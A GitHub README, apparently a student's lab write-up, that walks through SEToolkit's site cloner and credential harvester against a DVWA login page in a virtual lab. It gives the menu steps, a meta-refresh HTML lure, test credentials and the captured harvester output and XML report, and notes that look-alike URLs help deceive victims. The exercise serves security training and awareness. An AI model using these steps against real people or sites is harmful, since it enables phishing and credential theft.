# My First SEToolkit Experience: Website Cloning and Credential Harvesting

## Project Objective
This repository documents my first hands-on experience with the Social-Engineer Toolkit (SEToolkit).  
The main goal is to demonstrate, in a controlled and ethical environment:  
- Cloning a legitimate website.  
- Setting up a credential harvester to capture entered usernames and passwords.  

This is purely for **educational purposes** – to understand how phishing attacks work and highlight the importance of user awareness and security best practices.

## Important Disclaimer
**WARNING: This content is for educational and authorized testing purposes only.**

- The techniques shown here (website cloning and credential harvesting) simulate real-world phishing attacks.
- Phishing, unauthorized access to systems, or capturing credentials without explicit permission is **illegal** in most jurisdictions and can result in severe legal consequences.
- This repository and its author do **not** encourage, support, or condone any illegal activities.
- Use this information **only** in controlled lab environments (e.g., virtual machines you own) or with written consent for penetration testing.
- I am **not responsible** for any misuse, damage, or legal issues arising from the application of these techniques.
- Always follow ethical guidelines and local laws. Ethical hacking means improving security, not harming others.

Inspired by the official SEToolkit disclaimer: "This is only for testing purposes and can only be used where strict consent has been given. Do not use this for illegal purposes."

## Setup and Launching SEToolkit

**Note:** These steps assume you're using Kali Linux (where SEToolkit is pre-installed) in a virtual machine or isolated lab environment (mine is accordance with the cisco netacad ethical hacker program). Never test on real networks without permission.

### Starting SEToolkit
1. Open a terminal window.
2. Type `sudo -i` and press Enter. to obtain persistent root access. type in password
3. type  `setoolkit` 
4. When prompted, read the terms and type `y` to accept (this emphasizes ethical use).
5. SEToolkit will load and display the main menu.

### Navigating to Website Attack Vectors
From the main SEToolkit menu:

1. Type `1` and press Enter to select **Social-Engineering Attacks**.
2. Type `2` and press Enter to select **Website Attack Vectors**.

You are now in the Website Attack Vectors submenu – this is where we'll set up site cloning and credential harvesting in the next steps.


<img width="947" height="991" alt="WEBATTACK MENU SCREENSHOT" src="https://github.com/user-attachments/assets/f59e17f9-9f37-4eba-87b5-ebe0d2e21ae6" />

## Part 2: Credential Harvester Attack Method

**Objective of this section:**  
Set up a cloned login page that captures submitted credentials (username and password) before redirecting the user to the legitimate site. This demonstrates how phishing pages work in a controlled, ethical lab environment.

### Step 1: Selecting the Attack Method
1. From the **Website Attack Vectors** menu, type `3` and press Enter to select **Credential Harvester Attack Method**.
2. SEToolkit will display a brief description of the available harvesting techniques.

<img width="951" height="996" alt="3 CREDENTIAL HARVESTER SCREENSHOT" src="https://github.com/user-attachments/assets/4effaa23-0ea0-4093-9b69-ae380414174c" />

### Step 2: Cloning the Target Login Page

**Objective:**  
Create an exact replica of a target login page (in this lab, the Damn Vulnerable Web Application - DVWA) using SEToolkit's Site Cloner. The cloned page will be hosted locally on the Kali machine, capture any submitted credentials, and then seamlessly redirect the user to the legitimate site – simulating a real-world phishing attack without alerting the user.

**Important:** This is performed in a fully controlled lab environment using virtual machines owned by the author. Never target real websites or users without explicit written authorization.

**original site**

<img width="966" height="995" alt="4 WEBSITE TO CLONE" src="https://github.com/user-attachments/assets/2a9d4acc-048d-457a-8e86-e26dbb84d093" />

Back to the terminal
1. From the **Credential Harvester Attack Method** submenu, type `2` and press Enter to select **Site Cloner**.
2. SEToolkit will prompt for the URL of the website to clone.  
   In this lab, we use the DVWA login page hosted on a separate virtual machine: `http://dvwa.vm/login.php` (or simply `http://dvwa.vm/` if it redirects to the login page).
3. Enter the full URL when prompted and press Enter.
4. SEToolkit will then ask for the POST redirect URL (the legitimate site to send users to after credentials are captured). Use the same original URL here.
5. Finally, SEToolkit starts the local Apache web server and displays your Kali machine's IP address – this is the phishing URL you would distribute in a real attack scenario.

<img width="951" height="1002" alt="5 SITE CLONER SCREENSHOT" src="https://github.com/user-attachments/assets/765a986f-72f9-45fa-81aa-5d865718c3dc" />

<img width="957" height="993" alt="6 SITE CLONING " src="https://github.com/user-attachments/assets/0399ec60-ad1f-4653-8520-ec9f7b558597" />

When the website is cloned, the following message appears on the terminal.
The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:

## Part 3: Capturing and Viewing User Credentials

### Step 1: Create the Social Engineering Exploit

In a real-world scenario, the attacker would now distribute the phishing URL (the IP address of the Kali machine hosting the cloned site) through various means, such as email, SMS, malicious links, or QR codes.

For this controlled lab exercise, we simulate the distribution of the phishing link by creating a simple HTML redirect document. This file, when opened in a browser, automatically redirects the user to the cloned login page. It represents what might be attached or linked in a phishing campaign.

1. Open the Kali Linux text editor:  
   Go to **Applications** > **Favorites** > **Text Editor** (Mousepad).

2. Enter the following HTML code exactly as shown:
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>

<img width="636" height="467" alt="7 PHISHING EXPLOIT SCREENSHOT 2" src="https://github.com/user-attachments/assets/6f800403-41f5-4a85-8163-5f9c48d215f7" />

Select File > Save from the Mousepad menu. Name the document Great_link.html and save it in the /home/kali/Desktop Folder. The icon appears on the Kali desktop.
Close the Mousepad application.

### Step 2: Capture User Credentials.

The purpose of the cloned website is to present a web page that looks identical to the one that the user is expecting. A good hacker would create a fake URL that would be very similar to the actual URL, so that unless the user inspects the URL very closely, it would go unnoticed.

1. Double-click the desktop icon for the Great_link.html page. The DVWA login page that you viewed should appear in a browser window.

<img width="957" height="1003" alt="8 CLONED SITE" src="https://github.com/user-attachments/assets/02f50ce0-7928-4a37-ba7b-124167c1e5d8" />

**notice url**

Enter some information in the Username and Password fields and click Login to send the form.
Username: some.user@gmail.com
Password: Pa55w0rdd!

**notice changed url**

<img width="957" height="1002" alt="9 SITE URL CHANGED" src="https://github.com/user-attachments/assets/6a9393b6-9b11-49df-bf44-2fdcd40dbfd9" />

### Step 3: View the Captured Information.

Return to the terminal session that is running the SET application. Output from the login attempt should appear, similar to what is shown:
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: username=some.user@gmail.com
POSSIBLE PASSWORD FIELD FOUND: password=Pa55w0rdd!
POSSIBLE USERNAME FIELD FOUND: Login=Login
POSSIBLE USERNAME FIELD FOUND: user_token=69c0375a6ee98b96a5b643eed1e97f94
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

<img width="955" height="1005" alt="10 USERNAME X PASS SAVED" src="https://github.com/user-attachments/assets/5d7c1bf0-87ab-45e6-979d-43a759572da1" />

To save the report in XML format to use in other penetration testing applications, enter CTRL-C. The report file name and path are returned. Select the path and filename and right-click to copy the selection. The filenames that are created contain the date and time the file was created in this format:
2023-04-07 17:32:55.967169.xml
Continue to enter 99 and press enter until you have exited setoolkit. To view the content of the XML file, you need to place the filename in double-quotes (“) because it contains spaces and special characters. Use the cat command to see the information that is saved. The file path shown is the default path for the lab VM when this lab was created.

┌──(root㉿Kali)-[~]
└─# cat /root/.set/reports/”2023-04-07 17:32:55.967169.xml”
 
<?xml version=”1.0” encoding=”UTF-8”?>
<harvester>
   URL=http://DVWA.vm
   <url>      <param>username=some.user@gmail.com</param>
      <param>password=Pa55w0rdd!</param>
      <param>Login=Login</param>
      <param>user_token=69c0375a6ee98b96a5b643eed1e97f94</param>
   </url>
</harvester>

<img width="950" height="1002" alt="11 FINAL REPORT" src="https://github.com/user-attachments/assets/5b3eec5d-2099-4af5-b9bd-a76f97656b15" />

Successfuly cloned a website for social engineering.

Thank you for visiting! Feedback welcome via issues.
